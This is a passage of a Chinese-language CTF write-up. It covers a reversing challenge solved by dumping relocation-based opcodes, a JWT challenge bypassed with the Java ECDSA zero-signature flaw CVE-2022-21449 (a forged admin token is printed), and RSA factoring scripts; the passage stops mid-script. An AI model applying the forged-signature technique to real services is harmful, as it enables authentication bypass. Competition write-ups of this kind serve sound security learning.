</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> type(op)<span style="color:#f92672">.</span>__name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;REL&#39;</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[</span><span style="color:#e6db74">{</span>op<span style="color:#f92672">.</span>ridx<span style="color:#e6db74">:</span><span style="color:#e6db74">04d</span><span style="color:#e6db74">}</span><span style="color:#e6db74">] :: rel </span><span style="color:#e6db74">{</span>op<span style="color:#f92672">.</span>dst<span style="color:#e6db74">}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">{</span>op<span style="color:#f92672">.</span>val<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> type(op)<span style="color:#f92672">.</span>__name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;CPY&#39;</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[</span><span style="color:#e6db74">{</span>op<span style="color:#f92672">.</span>ridx<span style="color:#e6db74">:</span><span style="color:#e6db74">04d</span><span style="color:#e6db74">}</span><span style="color:#e6db74">] :: copy </span><span style="color:#e6db74">{</span>op<span style="color:#f92672">.</span>dst<span style="color:#e6db74">}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">{</span>op<span style="color:#f92672">.</span>symbol<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> type(op)<span style="color:#f92672">.</span>__name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;R64&#39;</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[</span><span style="color:#e6db74">{</span>op<span style="color:#f92672">.</span>ridx<span style="color:#e6db74">:</span><span style="color:#e6db74">04d</span><span style="color:#e6db74">}</span><span style="color:#e6db74">] :: r64 </span><span style="color:#e6db74">{</span>op<span style="color:#f92672">.</span>dst<span style="color:#e6db74">}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">{</span>op<span style="color:#f92672">.</span>symbol<span style="color:#e6db74">}</span><span style="color:#e6db74"> + </span><span style="color:#e6db74">{</span>op<span style="color:#f92672">.</span>addend<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> type(op)<span style="color:#f92672">.</span>__name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;R32&#39;</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#39;7&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(op<span style="color:#f92672">.</span>ridx <span style="color:#f92672">==</span> <span style="color:#ae81ff">1266</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>instructions <span style="color:#f92672">=</span> parse(b)
</span></span><span style="display:flex;"><span>dump(instructions)
</span></span></code></pre></div><p>提取后发现主要逻辑为加载 shellcode 并执行</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>[0005] :: rel s2, flag[0]
</span></span><span style="display:flex;"><span>[0006] :: rel s2.st_size, 1
</span></span><span style="display:flex;"><span>[0007] :: copy s4, s2
</span></span><span style="display:flex;"><span>[0009] :: rel r8.r_address, 0x16008040cc253480
</span></span><span style="display:flex;"><span>[0010] :: rel r8.r_info, 0xc3
</span></span><span style="display:flex;"><span>[0011] :: rel s3, r8.r_address
</span></span><span style="display:flex;"><span>[0012] :: rel s3.st_name, 0x1000a0000001a
</span></span><span style="display:flex;"><span>[0013] :: r64 r8.r_address, 3 + 0
</span></span><span style="display:flex;"><span>[0014] :: rel s2, r101002.r_address
</span></span><span style="display:flex;"><span>[0015] :: rel s2.st_size, 0x18
</span></span><span style="display:flex;"><span>[0016] :: copy r8.r_address, s2
</span></span><span style="display:flex;"><span>[0018] :: rel r17.r_address, 0x8040cc250480
</span></span><span style="display:flex;"><span>[0019] :: rel r17.r_info, 0xc3
</span></span><span style="display:flex;"><span>[0020] :: rel s3, r17.r_address
</span></span><span style="display:flex;"><span>[0021] :: rel s3.st_name, 0x1000a0000001a
</span></span><span style="display:flex;"><span>[0022] :: r64 r17.r_address, 3 + 0
</span></span><span style="display:flex;"><span>[0023] :: copy r17.r_address, s2
</span></span><span style="display:flex;"><span>[0024] :: rel s2, s4
</span></span><span style="display:flex;"><span>[0025] :: rel s2.st_size, 1
</span></span><span style="display:flex;"><span>[0026] :: copy r3.r_address, s2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[0597] :: rel s2, r3.r_address
</span></span><span style="display:flex;"><span>[0598] :: rel s2.st_size, 8
</span></span><span style="display:flex;"><span>[0599] :: copy s6, s2
</span></span><span style="display:flex;"><span>[0601] :: rel r600.r_address, 0x70008040fc253480
</span></span><span style="display:flex;"><span>[0602] :: rel r600.r_info, 0xc3
</span></span><span style="display:flex;"><span>[0603] :: rel s3, r600.r_address
</span></span><span style="display:flex;"><span>[0604] :: rel s3.st_name, 0x1000a0000001a
</span></span><span style="display:flex;"><span>[0605] :: r64 r600.r_address, 3 + 0
</span></span><span style="display:flex;"><span>[0606] :: rel s2, r101002.r_address
</span></span><span style="display:flex;"><span>[0607] :: rel s2.st_size, 0x18
</span></span><span style="display:flex;"><span>[0608] :: copy r600.r_address, s2
</span></span><span style="display:flex;"><span>[0609] :: rel s2, s6
</span></span><span style="display:flex;"><span>[0610] :: rel s2.st_size, 8
</span></span><span style="display:flex;"><span>[0611] :: copy r612.r_addend, s2
</span></span><span style="display:flex;"><span>[0612] :: r64 s5, 5 + 0
</span></span><span style="display:flex;"><span>[0613] :: rel r612.r_addend, 0
</span></span><span style="display:flex;"><span>[0614] :: rel s6, 0
</span></span></code></pre></div><p>上述代码对 flag 第一位执行了两处 shellcode，shellcode 为 <code>f ^ 0x16 + 0</code>
随后对该值 xor 0x70，最后值为 0 表示通过</p>
<p>前28位flag均是该逻辑的重复</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>xor <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x16</span>, <span style="color:#ae81ff">0x17</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0x11</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x13</span>, <span style="color:#ae81ff">0x14</span>, <span style="color:#ae81ff">0x15</span>, <span style="color:#ae81ff">0x16</span>, <span style="color:#ae81ff">0x17</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x19</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x2c</span>, <span style="color:#ae81ff">0x26</span>, <span style="color:#ae81ff">0x1e</span>, <span style="color:#ae81ff">0x1f</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x21</span>, <span style="color:#ae81ff">0x23</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x25</span>, <span style="color:#ae81ff">0x26</span>, <span style="color:#ae81ff">0x27</span>]
</span></span><span style="display:flex;"><span>add <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0x2</span>, <span style="color:#ae81ff">0x3</span>, <span style="color:#ae81ff">0x4</span>, <span style="color:#ae81ff">0x5</span>, <span style="color:#ae81ff">0x6</span>, <span style="color:#ae81ff">0x7</span>, <span style="color:#ae81ff">0x8</span>, <span style="color:#ae81ff">0x9</span>, <span style="color:#ae81ff">0xa</span>, <span style="color:#ae81ff">0xb</span>, <span style="color:#ae81ff">0xc</span>, <span style="color:#ae81ff">0xd</span>, <span style="color:#ae81ff">0xe</span>, <span style="color:#ae81ff">0xf</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0x11</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x13</span>, <span style="color:#ae81ff">0x14</span>, <span style="color:#ae81ff">0x15</span>, <span style="color:#ae81ff">0x16</span>, <span style="color:#ae81ff">0x17</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x19</span>, <span style="color:#ae81ff">0x1a</span>, <span style="color:#ae81ff">0x1b</span>]
</span></span><span style="display:flex;"><span>xor2 <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x70</span>, <span style="color:#ae81ff">0x7c</span>, <span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0x78</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x2a</span>, <span style="color:#ae81ff">0x2c</span>, <span style="color:#ae81ff">0x7f</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x2d</span>, <span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0x37</span>, <span style="color:#ae81ff">0x3b</span>, <span style="color:#ae81ff">0x22</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x8e</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x2a</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x2d</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x2d</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x32</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> x1, a, x2 <span style="color:#f92672">in</span> zip(xor, add, xor2):
</span></span><span style="display:flex;"><span>    print (chr((x2 <span style="color:#f92672">-</span> a) <span style="color:#f92672">^</span> x), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># flag{366c950370fec47e34581a0</span>
</span></span></code></pre></div><p>对最后几位flag进行了如下计算</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>(flag[<span style="color:#ae81ff">28</span>] <span style="color:#f92672">+</span> flag[<span style="color:#ae81ff">29</span>]) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x6c</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>(flag[<span style="color:#ae81ff">28</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> flag[<span style="color:#ae81ff">29</span>]) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xa1</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>(flag[<span style="color:#ae81ff">30</span>] <span style="color:#f92672">+</span> flag[<span style="color:#ae81ff">31</span>]) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xb1</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>(flag[<span style="color:#ae81ff">30</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> flag[<span style="color:#ae81ff">31</span>]) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xe5</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p>计算得到flag最后四位</p>
<h2 id="crypto">Crypto</h2>
<h3 id="myjwt">MyJWT</h3>
<p>一个基于 ECDSA 的 JWT，需要绕过签名验证得到 flag。签名头部 base64 解码，admin 字段为 false，考虑将其修改为 true 后绕过。</p>
<p>搜索发现漏洞 CVE-2022-21449。<code>https://jfrog.com/blog/cve-2022-21449-psychic-signatures-analyzing-the-new-java-crypto-vulnerability/</code>，未验证提交签名中参数是否为 0，提交定长空字节的 base64 编码即可通过验证。</p>
<p>ECDSA 内置实例算法采用 SHA384，对应签名 base64 长度为 128，编码 96 个空字节即可。远程连接提交用户名拿到 Token，在有效时间内修改 admin 字段为 true 后重新编码。payload 为初始字段+修改了admin的头部+空字节编码。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>eyJ0eXAiOiJKV1QiLCJhbGciOiJteUVTIn0=.eyJpc3MiOiJxd2IiLCJuYW1lIjoic2IiLCJhZG1pbiI6dHJ1ZSwiZXhwIjoxNjU5MTk1NTg0NTgwfQ==.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span></code></pre></div><h3 id="factor">Factor</h3>
<p><figure 
	>
	<a href="https://eprint.iacr.org/2015/399.pdf" >
		<img src="https://eprint.iacr.org/2015/399.pdf"
			
			
			
			loading="lazy"
			alt="https://eprint.iacr.org/2015/399.pdf">
	</a>
	
	<figcaption><a class="link" href="https://eprint.iacr.org/2015/399.pdf"  target="_blank" rel="noopener"
    >https://eprint.iacr.org/2015/399.pdf</a></figcaption>
	
</figure></p>
<p>参照这篇论文的做法，论文中提到的三种攻击就对应了此题的三关，反序解出即可。</p>
<p>第一二关都是Coppersmith方法解决，用sage中的small_roots()函数。</p>
<p>第三关采用连分数解决。</p>
<p>第一二关脚本 and 第三关脚本</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>n3<span style="color:#f92672">=</span><span style="color:#ae81ff">539779851369541956878655738599584730199799866957191805784596190682932284216781781433367450841202917758999300635019369629627621029957135109806205877317954671312041249493462048283611940752235036153024920172209763260723728345918562258401803973624430150143563078517485996070862532682695228590709019451174548520135142052216785774589096706631010293690859363524584240662502290912412366366114571976050857239915691266377257797199583543940504695517331512813468837128344612227973709974625418257243011036826241599265375741977853552204640800449679679351666009764297016524814036295707311913711955324055690490892097177271718850857268982130811714517356073266905474635370690445031512184247179039751734276906533177939993769044135143389748416635981226449566039039202521305851567296884751935162651063209779647359922622084851547605090230221057349511482738300221222563908357379545905837110168948295030747460300104202323692732549831403834387939156877086852393515817984772384147449841124275061609701453997579569931391166586163299940486204581696722731952467570857217406030804590055255431828403195798003509083922294733709507134156466158642941338493323430671502043066148246348074878064089651235355282144209668143249348243220714471988019011613749340243917652821</span>
</span></span><span style="display:flex;"><span>R<span style="color:#f92672">.&lt;</span>x<span style="color:#f92672">&gt;</span> <span style="color:#f92672">=</span> PolynomialRing(Zmod(n3),implementation<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;NTL&#39;</span>)
</span></span><span style="display:flex;"><span>e3<span style="color:#f92672">=</span><span style="color:#ae81ff">8179300978753084587812861894047395225516049110376948812109811319430275614612773726672345893359691900281432484382670047044697374818043512731533402576374645405477207239801498428774783768163880078495448747421425078521981578408638790336528372019271073712013371141939808017049399434858687299480461753638164719404612128939787055797762174745092074547412183349192156638711750872083313795551439465507724807626674514935170104573715458782366469587138508845980490673890245713729782917089910271980557159592807350504157192913530007199510144004848020221181558472160543018733124225266127379373751910439604459368078652499029070936707349862139053913745186413782066470461478961703013591655136140060879250067379283913798867648758171004535775565306842444545755351202796833177560656564652632975685912935281581268141803696686952259539945588609591385807620108279333498170028167338690235117003515264281843953984997958878272347778561933726792473981855755454522886321669676790813189668084373153897754540290867346751033567500922477317530445967753955221454744946208555394588111484610700789566547507402309549957740815535069057837915204852490930168843605732632328017129154852857227895362549146737618906180651623216848500491438142456250653458053922622240299736136335179639180898730269690699965799644757774472147210271111150769048976871249731156387939260749192370361488285775377622944817570292095201906142567403539151179209316853493906909989301225903409448461436855145</span>
</span></span><span style="display:flex;"><span>z<span style="color:#f92672">=</span><span style="color:#ae81ff">17623328397444755087284107444487160871617682792372566887446834913712379373851213638071138745775127796589871734472781755930251379295485892067473329763997583502625804363418069062645997342172778252731889437</span>
</span></span><span style="display:flex;"><span>f<span style="color:#f92672">=</span>e3<span style="color:#f92672">*</span>x<span style="color:#f92672">-</span>z
</span></span><span style="display:flex;"><span>f<span style="color:#f92672">=</span>f<span style="color:#f92672">.</span>monic()
</span></span><span style="display:flex;"><span>print(f<span style="color:#f92672">.</span>small_roots(beta<span style="color:#f92672">=</span><span style="color:#ae81ff">0.7</span>))
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> gmpy2
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> libnum <span style="color:#f92672">import</span> n2s
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> math <span style="color:#f92672">import</span> gcd
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tCf</span>(n, d):
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> d:
</span></span><span style="display:flex;"><span>        res<span style="color:#f92672">.</span>append(n <span style="color:#f92672">//</span> d)
</span></span><span style="display:flex;"><span>        n, d <span style="color:#f92672">=</span> d, n <span style="color:#f92672">%</span> d
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> res
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">cf</span>(sub_res):
</span></span><span style="display:flex;"><span>    n, d <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> sub_res[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]:
</span></span><span style="display:flex;"><span>        d, n <span style="color:#f92672">=</span> n, i <span style="color:#f92672">*</span> n <span style="color:#f92672">+</span> d
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> d, n
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">listFraction</span>(x, y):
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> tCf(x, y)
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> list(map(cf, (res[<span style="color:#ae81ff">0</span>:i] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, len(res)))))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> res
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>n11<span style="color:#f92672">=</span><span style="color:#ae81ff">801049932940568005269978912396585741498810389425615966036828877784238116634177290247194019425111606811005728521368879065336038221361037062407029836155148874719789714345603547779284558101833801155509762818376470874215789574939002212274399950433269775325144015468620263028557804618774240232988157961712628677901130814703917513004114547234375629747176834581166306552311075522669403347828095831520693563291249869832390698646691647204371133362254846234990175138047928703289833460734235302093916147489509206061923877623300596194317059884824322527532662470348274079800781120104946546063500763852622187404608639542858285661288293918912184354236687975919510300221932074135531028314170475917110204254042336116619335841213418990605590620842511615815443114612333881430920769002933370887494558640833005339906706603497809846863863967391543647049224309556936909768179259581851520214669904560467640473144481633920438487615788689262961741053146610554997224861331949716721056553499531186695425439163222802917813140266513735841447717418846360096652592844940362932171019143434080184728093326143821165097895058935372215708948088248596585127475770021962501262915274497478428868130455122612016408381607561200802267038869516896665387576895570245272035575637</span>
</span></span><span style="display:flex;"><span>n12<span style="color:#f92672">=</span><span style="color:#ae81ff">635401970340205725139325006504978344512744926958688031423448003992072769931808217486709574151492230879374574313457662436423263437792389711379687512056391117410807565492548718691166183372633151644917135272259770997096195518489056319350258673723095417922153182423913759272893696867426193704479752772511081457729513843682588951499551132432923147997238597538055902932123792252593514225328196541483451747314048080824405530742533473914329294346486691684904100406972073037050089861816604505650042953778360621934380815999541183067585498606053857125775979915077329566722531830089714823979965934190338538564188253271016367299890015449611141166780048763403252309160517164569110740561584100839212138661881615351382946813818078899882595313362934594951895560189003438775450675343590147821186953526262224973333962454561275321925151619178204499342339749637758100126893330994252902926509705617882239610380420830791088907378397226817514095468815228186716220057075095711894070032344613244803934541318573847029365563159918970404057137270884587905766828750387753130065274147902379993224780149663600462492281891320702134153853359393588902750423972068679293373333869389393970353760507436913233657422185531482023237384247535554666481760197851108297145147371</span>
</span></span><span style="display:flex;"><span>e11<span style="color:#f92672">=</span><span style="color:#ae81ff">1898839980562048754607069073527844852132536432440793106124181406514770178066775988232362054809850074774981836898118651469424148725970708199461113088705044905633592578936333918328544505910996746428679299419879472444790941363558025887620570856598548320246426354974395765243741646121743413447132297230365355148066914830856904433750379114692122900723772114991199979638987571559860550883470977246459523068862898859694461427148626628283198896659337135438506574799585378178678790308410266713256003479022699264568844505977513537013529212961573269494683740987283682608189406719573301573662696753903050991812884192192569737274321828986847640839813424701894578472933385727757445011291134961124822612239865</span>
</span></span><span style="display:flex;"><span>e12<span style="color:#f92672">=</span><span style="color:#ae81ff">1262647419018930022617189608995712260095623047273893811529510754596636390255564988827821761126917976430978175522450277907063247981106405519094560616378241247111698915199999363948015703788616554657275147338766805289909261129165025156078136718573006479030827585347458143645738353716189131209398056741864848486818076440355778886993462012533397208330925057305502653219173629466948635110352752162442552541812665607516753186595817376029707777599029040724727499952161261179707271814405907165207904499722122779096230563548011491932378429654764486855147873135769116637484240454596231092684424572258119768093562747249251518965380465994055049411715353547147466711949391814550591591830515262296556050946881</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> listFraction(n11, n12)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> res:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> n12 <span style="color:#f92672">%</span> i[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">and</span> n11 <span style="color:#f92672">%</span> i[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">and</span> i <span style="color:#f92672">!=</span> (<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>        q1 <span style="color:#f92672">=</span> i[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>        q2 <span style="color:#f92672">=</span> i[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>p1 <span style="color:#f92672">=</span> int(gmpy2<span style="color:#f92672">.</span>iroot(n11 <span style="color:#f92672">//</span> q1, <span style="color:#ae81ff">2</span>)[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>p2 <span style="color:#f92672">=</span> int(gmpy2<span style="color:#f92672">.</span>iroot(n12 <span style="color:#f92672">//</span> q2, <span style="color:#ae81ff">2</span>)[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>print(p1,p2)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>c11<span style="color:#f92672">=</span><span style="color:#ae81ff">18979511327426975645936984732782737165217332092805655747550406443960209507493506811471688957217003792679188427155591583024966608843371190136274378868083075515877811693937328204553788450031542610082653080302874606750443090466407543829279067099563572849101374714795279414177737277837595409805721290786607138569322435729584574023597293220443351227559400618351504654781318871214405850541820427562291662456382362148698864044961814456827646881685994720468255382299912036854657082505810206237294593538092338544641919051145900715456411365065867357857347860000894624247098719102875782712030938806816332901861114078070638796157513248160442185781635520426230183818695937457557248160135402734489627723104008584934936245208116232179751448263136309595931691285743580695792601141363221346329077184688857290503770641398917586422369221744736905117499140140651493031622040723274355292502182795605723573863581253354922291984335841915632076694172921289489383700174864888664946302588049384130628381766560976143458735712162489811693014419190718601945154153130272620025118408017441490090252674737105557818759190934585829634273698371996797545908125156282869589331913665938038870431655063063535672001112420959158339261862052308986374193671007982914711432579</span>
</span></span><span style="display:flex;"><span>c12<span style="color:#f92672">=</span><span style="color:#ae81ff">336587005671304527566745948355290412636261748969581976214239578621816863343117433524033533838636941679300497270909696775021031004312477997130741361709262822736904340641138652359632950455651920464042448022467664596484055174270895170499076347333381222768518599018520948098943626229061996126260154604038101543546588917619576702866444998578555907070990331574722135141778182631559802154493815687284077524469331290249057291163803290619701104007028836609832847351748020354798788508790258935718399783002069490123663345156902440501507117289747695510266461539019431610123351176227443612317037899257774045751487135646052309277098939919088029284437221840182769808850184827681307611389353392683707516141736067793897378911235819049432542758429901945202632117089595899280390575706266239252841152490534353760118231918190110043319877744119083811214707593122757409240645257409097436061825613686773916466122693168971062418046703969144004779270391320645495586024342668002497155358623795942692477164489475917351003149045087283510728981096449890130735055015075557614253867698702479920619299919816768972581273507837309179450374634916567083251630203067065663910073926990517108921490442919372774170201239734064819301693527366233007925670043499415100789027665</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>phi11 <span style="color:#f92672">=</span> (p1) <span style="color:#f92672">*</span> (p1<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q1<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>phi12 <span style="color:#f92672">=</span> (p2) <span style="color:#f92672">*</span> (p2<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q2<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>d11 <span style="color:#f92672">=</span> gmpy2<span style="color:#f92672">.</span>invert(e11,phi11)
</span></span><span style="display:flex;"><span>d12 <span style="color:#f92672">=</span> gmpy2<span style="color:#f92672">.</span>invert(e12,phi12)
</span></span><span style="display:flex;"><span>m1 <span style="color:#f92672">=</span> pow(c11,d11,n11)
</span></span><span style="display:flex;"><span>m2 <span style="color:#f92672">=</span> pow(c12,d12,n12)
</span></span><span style="display:flex;"><span>print(m1)
</span></span><span style="display:flex;"><span>print(m2)
</span></span><span style="display:flex;"><span>n2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">209798341155088334158217087474227805455138848036904381404809759100627849272231840321985747935471287990313456209656625928356468120896887536235496490078123448217785939608443507649096688546074968476040552137270080120417769906047001451239544719039212180059396791491281787790213953488743488306241516010351179070869410418232801398578982244984544906579574766534671056023774009163991804748763929626213884208260660722705479782932001102089367261720194650874553305179520889083170973755913964440175393646890791491057655226024046525748177999422035469428780228224800114202385209306803288475439775037067014297973202621118959024226798935588827359265962780792266516120013602384766460619793738405476219362508944225007365127768741191310079985425349292613888185378948854602285379329682053663283534930182589905986063348509703027498270111412063194971956202729807710253369312175636837558252924035002153389909587349043986253518050303628071319876207392440085675892353421232158925122721273720564784886530611286461575045181073744696415657043278123662980166364494583141297996445429477446442693717498789391918530672770193730629928408766563592081857706608049076318165712479742423149330311238462044666384622153280310696667586565906758451118241914402257039981388209</span>
</span></span><span style="display:flex;"><span>x <span style="color:#f92672">=</span> <span style="color:#ae81ff">3549384841973213309621072870106254602253656209014197632823411827739864720839737811030401306800875843661955913236834617545674409639259372934721570288281471569069146201536309734296340629562207991295283896</span>
</span></span><span style="display:flex;"><span>g <span style="color:#f92672">=</span> gcd(m1<span style="color:#f92672">*</span>m2<span style="color:#f92672">*</span>x<span style="color:#f92672">-</span>(m2<span style="color:#f92672">-</span>m1),n2)
</span></span><span style="display:flex;"><span>p2 <span style="color:#f92672">=</span> int(gmpy2<span style="color:#f92672">.</span>iroot(g,<span style="color:#ae81ff">6</span>)[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>q2 <span style="color:#f92672">=</span> n2 <span style="color:#f92672">//</span> (p2 <span style="color:#f92672">**</span> <span style="color:#ae81ff">7</span>)
</span></span><span style="display:flex;"><span>e2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10001</span>
</span></span><span style="display:flex;"><span>phi2 <span style="color:#f92672">=</span> (p2 <span style="color:#f92672">**</span> <span style="color:#ae81ff">6</span>) <span style="color:#f92672">*</span> (p2 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q2 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>d2 <span style="color:#f92672">=</span> gmpy2<span style="color:#f92672">.</span>invert(e2,phi2)
